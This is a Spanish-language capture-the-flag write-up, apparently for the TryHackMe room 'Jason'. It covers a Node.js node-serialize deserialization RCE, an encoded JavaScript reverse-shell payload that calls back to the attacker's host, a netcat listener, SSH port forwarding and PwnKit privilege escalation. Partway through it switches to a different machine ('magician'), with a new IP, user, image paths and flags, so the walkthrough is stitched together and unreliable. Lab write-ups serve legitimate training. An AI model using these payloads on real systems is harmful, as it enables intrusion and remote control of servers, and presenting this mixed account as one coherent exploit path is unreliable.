I"&W<h2 id="writeup-máquina-jason">WriteUp máquina <strong>Jason</strong></h2>

<p>Esta es una maquina con un nivel de dificultad Fácil en TryHackme vamos a ello:</p>
<h3 id="fase-de-reconocimineto">Fase de reconocimineto</h3>
<p>Como primer paso realizamos un ping a la maquina para identificar ante que maquina estamos:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">PING 10.10.58.237 (10.10.58.237) 56(84) bytes of data.
64 bytes from 10.10.58.237: icmp_seq=1 ttl=63 time=307 ms
</span></code></pre></div></div>

<p>Como observamos la maquina nos responde con un TTL=63 por lo que nos enfrentamos a una maquina linux.</p>

<p>El siguiente paso es ver que puertos abiertos tiene la maquina por lo que realizamos el siguiente escaneo:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.58.237 -oG allPorts
</span></code></pre></div></div>
<p>Y vemos los siguientes puertos abiertos:</p>

<table>
  <tbody>
    <tr>
      <td><strong>PORT</strong></td>
      <td><strong>STATE</strong></td>
      <td><strong>SERVICE</strong></td>
      <td>**REASON **</td>
    </tr>
    <tr>
      <td>22/tcp</td>
      <td>open</td>
      <td>ssh</td>
      <td>syn-ack ttl 63</td>
    </tr>
    <tr>
      <td>80/tcp</td>
      <td>open</td>
      <td>http</td>
      <td>syn-ack ttl 63</td>
    </tr>
  </tbody>
</table>

<p>Teniendo los puertos abiertos identificamos la version de los servicios expuestos con el siguiente comando:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap -sC -sV -p22,80 10.10.58.237 -oN targeted
</span></code></pre></div></div>
<p>Dando como resultado los siguientes servicios:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">PORT   STATE SERVICE VERSION                                                                                                                                                               
</span><span class="gp">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>                                                                                                          
<span class="go">| ssh-hostkey:                                                                                                                                                                             
|   3072 5b:2d:9d:60:a7:45:de:7a:99:20:3e:42:94:ce:19:3c (RSA)                                                                                                                             
|   256 bf:32:78:01:83:af:78:5e:e7:fe:9c:83:4a:7d:aa:6b (ECDSA)                                                                                                                            
|_  256 12:ab:13:80:e5:ad:73:07:c8:48:d5:ca:7c:7d:e0:af (ED25519)                                                                                                                          
80/tcp open  http                                                                                                                                                                          
| fingerprint-strings:                                                                                                                                                                     
|   GetRequest, HTTPOptions:                                                                                                                                                               
|     HTTP/1.1 200 OK                                                                                                                                                                      
|     Content-Type: text/html                                                                                                                                                              
|     Date: Wed, 09 Feb 2022 21:12:16 GMT                                                                                                                                                  
|     Connection: close                                                                                                                                                                    
</span><span class="gp">|     &lt;html&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>                                                                                                                                                                         
<span class="gp">|     &lt;title&gt;</span>Horror LLC&lt;/title&gt;                                                                                                                                                            
<span class="gp">|     &lt;style&gt;</span><span class="w">                                                                                                                                                                              
</span><span class="go">|     body {                                                                                                                                                                               
</span><span class="gp">|     background: linear-gradient(253deg, #</span>4a040d, <span class="c">#3b0b54, #3a343b);                                                                                                                      </span>
<span class="gp">|     background-size: 300% 300%;</span><span class="w">                                                                                                                                                          
</span><span class="gp">|     -webkit-animation: Background 10s ease infinite;</span><span class="w">
</span><span class="gp">|     -moz-animation: Background 10s ease infinite;</span><span class="w">
</span><span class="gp">|     animation: Background 10s ease infinite;</span><span class="w"> 
</span><span class="go">|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|_    background-posi
|_http-title: Horror LLC

</span></code></pre></div></div>
<p>Como podemos observar existe un servicio web por lo que inspeccionamos el servicio en el puerto 80</p>

<p><img src="/images/writeup/jason/panel.png" alt="Panel" /></p>

<p>Vemos que el sitio web menciona que esta hecho con nodejs (<strong>Built with Nodejs</strong>) por lo que lo tenemos encuenta para las posteriores fases.</p>

<h3 id="fase-de-explotacion">Fase de explotacion</h3>

<p>Despues de revisar la funcionalidad del sitio web observamos que al poner un correo en el campo de email address, se nos asigna una cookie donde el valor de session es una cadena en base64 si la decodificamos resulta ser el texto que pusimos de entrada por lo que nos indica que hay algun tipo de procesamiento de los datos como se muestra en la siguiente imagen:</p>

<p><img src="/images/writeup/jason/base64.png" alt="Panel" /></p>

<p>Por lo que con los datos hasta ahora ya podriamos deducir el vector de ataque.<br />
Si buscamos exploit por la web referentes a Nodejs hay uno que llama la atención que es un exploit que permite la ejecución remota de comandos mediante la deserealizacion de los datos tramitados para mas detalles puedes ver el siguiente link:   <br />
<strong><a href="https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf">Deserealization exploit</a></strong>.</p>

<p>Para replicar este exploit  basicamente necesitamos desarrollar los siguientes pasos:</p>

<h3 id="1-serializar-los-datos">[1] Serializar los datos</h3>

<p>Para ello podemos hacer uso del script <strong>serialize.js</strong>:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">{</span>
<span class="na">rce</span> <span class="p">:</span> <span class="kd">function</span><span class="p">(){</span>
<span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">whoami</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span><span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span> <span class="p">});</span>
    <span class="p">},</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Serialized: </span><span class="se">\n</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">serialize</span><span class="p">.</span><span class="nx">serialize</span><span class="p">(</span><span class="nx">y</span><span class="p">));</span>
</code></pre></div></div>
<p>es importante tener npm installado y la libreria node-serialize:</p>

<pre><code class="language-code">npm install node-serialize
</code></pre>
<p>Si todo va bien hasta este punto al correr el siguiente comando:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">node serialize.js
</span></code></pre></div></div>
<p>deberia dar como resultado la siguiente salida:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">rce</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function(){</span><span class="se">\n</span><span class="s2">require('child_process').exec('whoami', function(error,stdout, stderr) { console.log(stdout) });</span><span class="se">\n</span><span class="s2">}</span><span class="dl">"</span><span class="p">}</span>
</code></pre></div></div>

<h3 id="2-deseralizar-datos">[2] Deseralizar datos</h3>

<p>Hasta este punto tendriamos los datos serializados pero recordemos que el servidor hace el proceso inverso es decir deserealizar los datos por lo que creamos el archivo <strong>unserialize.js</strong>:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">{"rce":"_$$ND_FUNC$$_function(){require(</span><span class="se">\'</span><span class="s1">child_process</span><span class="se">\'</span><span class="s1">).exec(</span><span class="se">\'</span><span class="s1">whoami</span><span class="se">\'</span><span class="s1">, function(error,stdout, stderr) { console.log(stdout) });}()"}</span><span class="dl">'</span>
<span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">payload</span><span class="p">);</span>
</code></pre></div></div>
<p>Si ejecutamos este script con node podriamos observar en nuestro sistema que tenemos la capacidad de ejecutar comandos:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@parrot ▓▒░ node unserialize.js 
root
</span></code></pre></div></div>

<p>Ahora que tenemos toda la estructura armada buscamos la forma de entablar una reverse shell a nuestra maquina, para ello el articulo <strong><a href="https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf">Deserealization exploit</a></strong> que mencionamos tiene una utilidad para obtener una reverse shell mediante js la cual esta disponible en: <strong><a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">NodeJS Shell</a></strong></p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">python2 nodejsshell.py IP 4444                             
[+] LHOST = IP
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,57,46,51,46,57,52,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
</span></code></pre></div></div>

<p>Se puede subir directamente la imagen generar pero yo decidi simplemente copiar el contenido del archivo a la peticion<br />
interceptada de burpsuite:</p>

<p><img src="/images/writeup/magician/revburp.png" alt="Panel" /></p>

<p>Subiendo este archivo nos ponemos a la escucha con netcat y recibimos una shell reversa para luego hacer un tratamiento de la tty:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@parrot ▓▒░ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.89.16 55846
script /dev/null -c bash
Script started, file is /dev/null
</span><span class="gp">magician@magician:/tmp/hsperfdata_magician$</span><span class="w"> </span>^Z
<span class="go">zsh: suspended  nc -nlvp 4444

</span><span class="gp">root@parrot ▓▒░ stty raw -echo;</span><span class="w"> </span><span class="nb">fg</span>
<span class="go">[1]  + continued  nc -nlvp 4444
                               reset xterm
</span></code></pre></div></div>
<p>Exportamos las variables de entorno:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">magician@magician:/tmp/hsperfdata_magician$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="gp">magician@magician:/tmp/hsperfdata_magician$</span><span class="w"> </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
<span class="go">
</span></code></pre></div></div>

<p>Y podemos ver la flag del usuario magician:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">THM{simsalabim_hex_hex}
</span></code></pre></div></div>
<h3 id="escalada-de-privilegios">Escalada de privilegios</h3>

<p>Como primer paso en la escalada de privilegios buscamos archivos suspechosos que puedan tener credenciales o archivos de configuracion<br />
en este caso encontramos un archivo 
<img src="/images/writeup/magician/archive.png" alt="Panel" /></p>

<p>Inspeccionando el contenido de este archivo nos encontramos con un mensaje:</p>

<p><strong>“The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.”</strong></p>

<p>El mensaje nos da a entender que hay un puerto a la escucha por lo que verificamos puertos abiertos por lo que verificamos puertos a la escucha:</p>

<p><img src="/images/writeup/magician/netstat.png" alt="Panel" /></p>

<p>Si bien no podemos ver este puerto desde afuera podemos realizar una tecnica llamada port forwarding con el siguiente comando:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">magician@magician:~$</span><span class="w"> </span>ssh <span class="nt">-R</span> 6666:127.0.0.1:6666 root@10.9.3.94                                                                                                                             
<span class="go">root@10.9.3.94's password:                                                                                                                                                                 
</span></code></pre></div></div>
<p>Asi redirigimos todo el trafico del puerto 6666 a nuestra maquina en el puerto 6666.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@parrot ▓▒░ nmap -sCV -p6666 127.0.0.1  
PORT     STATE SERVICE VERSION
6666/tcp open  http    Gunicorn 20.0.4                                                                                                                                                  
|_http-server-header: gunicorn/20.0.4                                                                                                                                                   
|_http-title: The Magic cat                                                                                                                                                             
|_irc-info: Unable to open connection  
</span></code></pre></div></div>
<p>Vemos un servicio HTTP expuesto pero el navegador restringe este tipo de puertos, por lo que debemos habilitar este puerto para ello debemos realizar el siguiente paso en firefox:</p>

<p><img src="/images/writeup/magician/portsRestricted.png" alt="Panel" /></p>

<p>Habilitando este puerto en el navegador observamos un panel donde podemos ver un archivo en este caso se selecciona esta opcion hasta obtener una cadena en base64:</p>

<p><img src="/images/writeup/magician/pANEL6666.png" alt="Panel" /></p>

<p>Decodificamos el resultado y obtenemos la flag:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@parrot ▓▒░ echo "VEhNe21hZ2ljX21heV9tYWtlX21hbnlfbWVuX21hZH0K" | base64 -d
THM{magic_may_make_many_men_mad}
</span></code></pre></div></div>
<h3 id="forma-alternativa">Forma alternativa</h3>
<p>Un reciente vulnerabilidad fue expuesta en estas fechas por lo que hice la prueba si este binario funcionaria ya que pkexec tiene privilegios SUID<br />
para ello descargamos el exploit disponible en <strong><a href="https://github.com/ly4k/PwnKit">Pwnkit</a></strong> :</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">magician@magician:/tmp$</span><span class="w"> </span><span class="nb">chmod</span> +x  PwnKit 
<span class="gp">magician@magician:/tmp$</span><span class="w"> </span>./PwnKit 
<span class="gp">root@magician:/tmp#</span><span class="w"> </span><span class="nb">cd</span> /root
<span class="gp">root@magician:~#</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ImageMagick  flask  root.txt
</span><span class="gp">root@magician:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt 
<span class="go">THM{magic_may_make_many_men_mad}
</span></code></pre></div></div>

:ET